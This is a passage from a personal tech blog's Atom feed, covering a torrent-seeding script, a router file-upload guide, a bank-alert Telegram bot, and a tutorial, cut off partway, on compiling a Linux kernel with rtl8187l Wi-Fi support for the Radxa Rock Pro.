                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2018-02-17-torrentleechseeder-and-dlink-dsl-6740u-file-upload&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;I recently worked on 2 useful mini-projects that I wanted to share, in case it’s useful to anyone.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;torrentleechseeder&amp;quot;&amp;gt;TorrentLeechSeeder&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;My home Internet connection is slow. Especially the upload. It was hurting my upload&amp;#x2F;download ratio in the popular BitTorrent tracker BitTorrent tracker &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;torrentleech.org&amp;quot;&amp;gt;TorrentLeech&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I started choosing torrents to download by the amount of seeders &amp;#x2F; leechers they have, but doing this manually took too much time.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;So I wrote a script that scrapes TorrentLeech searching for the most &amp;quot;efficient&amp;quot; torrents to download and then seed, using &amp;quot;aria2c&amp;quot; for downloading&amp;#x2F;seeding.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;You can read more and clone the code at GitHub:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;TorrentLeechSeeder.git&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;TorrentLeechSeeder.git&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;dlink-dsl-6740u-file-upload&amp;quot;&amp;gt;DLink DSL-6740U File Upload&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;As I previously mentioned - my home Internet connection is &amp;lt;strong&amp;gt;*very*&amp;lt;&amp;#x2F;strong&amp;gt; slow.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I wanted to upload tcpdump to see what’s taking all my bandwidth, but there was no nc, wget or anything useful - only httpd.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;So I wrote a small guide with snippets of how to upload any files (including the right statically-compiled tcpdump binary).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;You can find it here on GitHub:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;DSL-6740UFileUpload&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;DSL-6740UFileUpload&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Israel Finance Telegram Bot</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-01-19-israel-finance-telegram-bot&#x2F;"/>
                <updated>2019-01-19T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-01-19-israel-finance-telegram-bot&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;When it comes to monitoring your expenses, different people have different methods. Some read the monthly-sent billing summary from each credit card provider &amp;#x2F; bank, some login to these services repeatedly to check if there’s something new. I prefer getting the expenses as phone notifications while I can still remember what the expense was for, not a month after.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;When I was an Android owner I used to pay a (very cheap) subscription fee for an app called &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;play.google.com&amp;#x2F;store&amp;#x2F;apps&amp;#x2F;details?id=com.applaudsoftware.safecharge&amp;quot;&amp;gt;חיוב בטוח&amp;lt;&amp;#x2F;a&amp;gt;. This app was perfect for me - it scraped the credit card providers for new transactions and let me choose whether I approve &amp;#x2F; deny this transaction, so I can review those I denied when I have time. Using this method I found multiple subscriptions that I thought I cancelled and billings that were for the wrong amount.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;But although I love this app, I can’t ignore my 3 problems with it:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;It only supports Android (I moved to iPhone and I don’t have this solution anymore)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;I don’t trust closed-source solutions I enter my credit card credentials into (how do I know it’s not being uploaded?)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;It doesn’t support bank accounts, only credit cards&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;Mainly because of the iPhone transition, I was left without a working solution. So I decided to develop one.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;My solution is a small Telegram bot script that can run on your computer, scrapes the credit card &amp;lt;strong&amp;gt;and bank&amp;lt;&amp;#x2F;strong&amp;gt; accounts (using the open-source &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;eshaham&amp;#x2F;israeli-bank-scrapers&amp;quot;&amp;gt;Israeli Bank Scrapers&amp;lt;&amp;#x2F;a&amp;gt; project) and sends you notifications about new transactions using Telegram. It also supports &amp;quot;denying transactions&amp;quot; (marking them as denied so you can look into them later on). Most importantly - it’s open-source! So you don’t have to trust me your credentials aren’t being uploaded anywhere, you’re the one running the script on your computer and you can read the 1 file of source code yourself.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If you’re like me and need this solution - have a look at the project’s GitHub page: &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;israel-finance-telegram-bot&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;israel-finance-telegram-bot&amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Compiling Kernel for Radxa Rock Pro (+ rtl8187l support)</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2015-05-02-compiling-new-kernel-for-radxa-rock-pro-rtl8187l-support&#x2F;"/>
                <updated>2015-05-02T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2015-05-02-compiling-new-kernel-for-radxa-rock-pro-rtl8187l-support&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;In the past few weeks I’ve been struggling to compile a kernel module for the Radxa Rock Pro, and ended up compiling the upstream kernel manually while configuring it to support my module.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Since it took much longer than I expected (mainly because of unexpected problems I wish I had known before I took this project), I decided to make a post describing my adventures with this wonderful device (and yes, I had to open a new blog to do that 🙃).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;In this blog post I will try to describe the steps I had to make, including download links, of configuring, compiling and loading the upstream Linux kernel for the Radxa Rock Pro device.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;When you’re done following this post, you should end up with a Rock Pro with the 3.18.11 Linux kernel, that loads it’s rootfs from the MicroSD card. &amp;lt;strong&amp;gt;Note that as far as I know, Rock Pro’s HDMI output is not supported on these new kernels (it didn’t work for me as well), so be sure you want don’t need your HDMI output before following this post.&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Disclaimer: Most of the information in this post is taken from online posts, mainly from the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;radxa.com&amp;#x2F;Rock&amp;#x2F;Linux_Mainline&amp;quot;&amp;gt;Radxa wiki&amp;lt;&amp;#x2F;a&amp;gt; and &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;www.cnx-software.com&amp;#x2F;2014&amp;#x2F;01&amp;#x2F;27&amp;#x2F;getting-started-with-raxda-rock-how-to-generate-and-flash-ubuntu-saucy-server-and-desktop-images&amp;#x2F;&amp;quot;&amp;gt;CNX-Software blog&amp;lt;&amp;#x2F;a&amp;gt;. This post is just my attempt of simplifying all of the online information, and documenting &amp;#x2F; solving some issues I had when I tried to follow the online instructions.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;alfa-awus036h&amp;quot;&amp;gt;ALFA AWUS036H&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;compiling-new-kernel-for-radxa-rock-pro-rtl8187l-support&amp;#x2F;1.jpg&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;
My target was to make the Radxa Rock Pro support ALFA AWUS036H’s monitor mode, and later on - airodump-ng and other similar tools. Sound simple!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Since I had never heard of this network device until I started this project, I looked it up online and saw it is based on the famous Realtek RTL8187L chipset. Searching online also brought up that I should make the rtl8187l driver run on my Rock Pro device, and I’ll be done with this project.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;However, in order to compile a kernel module, I must have the running kernel + it’s configuration, and make sure it supports the Linux features required for the module to work (in this case - WIRELESS_EXT, MAC80211, …). After a few days of trying to compile the module with the pre-installed Radxa kernel from their site (3.0.36+ - &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;radxa&amp;#x2F;linux-rockchip&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;radxa&amp;#x2F;linux-rockchip&amp;lt;&amp;#x2F;a&amp;gt;), I realised that I must use the upstream kernel, that already contains official rtl8187l module support, with my own configuration.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;pre-requirements&amp;quot;&amp;gt;Pre-Requirements&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Radxa Rock Pro&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;MicroSD Card (8GB+)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;As the Radxa wiki says, you must own a Ubuntu 14.10 (or newer) Linux for the compilation process, along with GCC 4.9 or newer. When I tried to compile without these, I get an error from the precompiler stating that my compiler (GCC 4.8) has known issues when compiling the kernel, and that I should upgrade.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Of course, since we are compiling for the Radxa Rock Pro, you also need an environment including a cross compiler. You also need parted when creating the SD card image, and build-essential + libusb for rkflashtool. Run this installation line to install all dependencies before we start:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo apt-get install build-essential gcc-arm-linux-gnueabihf lzop libncurses5-dev libssl-dev bc parted build-essential libusb-1.0-0-de
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;kernel-source&amp;quot;&amp;gt;Kernel Source&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;The Radxa wiki states you should clone the linux-next git repository and compile it for the Rock Pro. When I tried to do so and follow their steps - the compilation failed since the configuration was too old.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;Therefore, I recommend using the Linux 3.18.11 kernel, it worked out-of-the-box and didn’t require any code changes.&amp;lt;&amp;#x2F;strong&amp;gt; You can get it by running:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget https:&amp;#x2F;&amp;#x2F;www.kernel.org&amp;#x2F;pub&amp;#x2F;linux&amp;#x2F;kernel&amp;#x2F;v3.x&amp;#x2F;linux-3.18.11.tar.xz
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;tar xf linux-3.18.11.tar.xz
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; linux-3.18.11
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After extracting the kernel, you should download the default Rock Pro configuration along with the .dts file, that will be used when booting (again, taken from Wiki):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget http:&amp;#x2F;&amp;#x2F;rockchip.fr&amp;#x2F;radxa&amp;#x2F;linux&amp;#x2F;rockchip_defconfig -O arch&amp;#x2F;arm&amp;#x2F;configs&amp;#x2F;rockchip_defconfig
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget http:&amp;#x2F;&amp;#x2F;rockchip.fr&amp;#x2F;radxa&amp;#x2F;linux&amp;#x2F;rk3188-radxarock.dts -O arch&amp;#x2F;arm&amp;#x2F;boot&amp;#x2F;dts&amp;#x2F;rk3188-radxarock.dts
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;build-environment-configuration&amp;quot;&amp;gt;Build Environment Configuration&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Before we start to mess with kernel compilations, we should make sure to always use the cross-compiler environment suitable for our device.&amp;lt;br &amp;#x2F;&amp;gt;
Run the following &amp;lt;strong&amp;gt;in each terminal you use in the compilation process&amp;lt;&amp;#x2F;strong&amp;gt; to set the build environment:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;export &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ARCH&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;arm
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;export &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;CROSS_COMPILE&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;arm-linux-gnueabihf-
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h2 id=&amp;quot;configuring-kernel&amp;quot;&amp;gt;Configuring Kernel&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Copy the default Rock Pro configuration to the current configuration location:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cp arch&amp;#x2F;arm&amp;#x2F;configs&amp;#x2F;rockchip_defconfig .config
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And configure the kernel as you’d like by running:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make menuconfig
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;(the menuconfig will use the .config we copied as the base for your changes). Since I’m describing my efforts to add support for the rtl8187l kernel module, the things I had to enable in the Kernel configuration are the following &amp;lt;strong&amp;gt;(the order is important!)&amp;lt;&amp;#x2F;strong&amp;gt;:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;em&amp;gt;(You should navigate the menuconfig with the arrow keys and the space bar for selection. When selecting a feature, you can either mark it as built in &amp;amp;lt;*&amp;amp;gt;, kernel module &amp;amp;lt;M&amp;amp;gt; or unselected feature that will not be present in the kernel &amp;amp;lt; &amp;amp;gt;)&amp;lt;&amp;#x2F;em&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Networking support -&amp;amp;gt; Wireless -&amp;amp;gt; Generic IEEE 802.11 Networking Stack (mac802111) (NEW) - &amp;lt;strong&amp;gt;set this to have &amp;amp;lt;*&amp;amp;gt; on the side (built-in kernel support)&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Device Drivers -&amp;amp;gt; Network device support -&amp;amp;gt; Wireless LAN -&amp;amp;gt; Realtek 8187 and 8187B USB support - &amp;lt;strong&amp;gt;set this to have &amp;amp;lt;M&amp;amp;gt; on the side (kernel module)&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;Exit the menuconfig and choose &amp;amp;lt; Yes &amp;amp;gt; when asked whether to save the new configuration.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The message &amp;lt;em&amp;gt;&amp;quot;configuration written to .config&amp;quot;&amp;lt;&amp;#x2F;em&amp;gt; should appear after saving. Now it’s time to compile our new configuration.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;compiling-the-kernel-modules&amp;quot;&amp;gt;Compiling the Kernel + Modules&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Run the following commands:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make prepare
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make -j8 zImage dtbs
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;This will create 2 necessary files, zImage (the compressed kernel) and rk3188-radxarock.dtb (device tree blob, used at the Rock Pro boot).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Now let’s compile the modules for later use:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;mkdir modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;export &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;INSTALL_MOD_PATH&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;.&amp;#x2F;modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make modules
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make modules_install
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Now the &amp;quot;modules&amp;quot; directory is full with compiled kernel modules. We will use it later to build our SD card image.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;creating-boot-img&amp;quot;&amp;gt;Creating boot.img&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Run the following commands to install Radxa mkbootimg:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;neo-technologies&amp;#x2F;rockchip-mkbootimg.git
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; rockchip-mkbootimg
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo make install
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; ..
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;According to the wiki, we need to append the device tree blob to zImage (CONFIG_ARM_APPENDED_DTB option) until we can use U-Boot device tree support:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cat arch&amp;#x2F;arm&amp;#x2F;boot&amp;#x2F;zImage arch&amp;#x2F;arm&amp;#x2F;boot&amp;#x2F;dts&amp;#x2F;rk3188-radxarock.dtb &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; zImage-dtb
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And after we have everything ready, make the boot.img out of the zImage-dtb:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;mkbootimg --kernel zImage-dtb --ramdisk &amp;#x2F;dev&amp;#x2F;null -o boot.img
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;My working &amp;amp;amp; ready boot.img is available for download &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;dl.dropboxusercontent.com&amp;#x2F;u&amp;#x2F;3819031&amp;#x2F;boot.img&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;preparing-sd-card-image&amp;quot;&amp;gt;Preparing SD Card Image&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;When we’ll flash the kernel onto the Rock Pro, it will load and try to load the linux rootfs from the MicroSD card (you’ll see, when it’s part of the configuration that will be flashed in the next few steps).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Therefore we should make an SD card image ready with all of the compatible binaries and the modules we have compiled earlier, including the rtl8187l module.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;To do that, we should start with an already ready SD card image, mount it’s ext4 partition locally on our Ubuntu and insert the kernel modules we built before.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I used &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;dl.radxa.com&amp;#x2F;rock_pro&amp;#x2F;images&amp;#x2F;ubuntu&amp;#x2F;sd&amp;#x2F;radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.zip&amp;quot;&amp;gt;this&amp;lt;&amp;#x2F;a&amp;gt; SD card image and did the following:&amp;lt;&amp;#x2F;p&amp;gt;
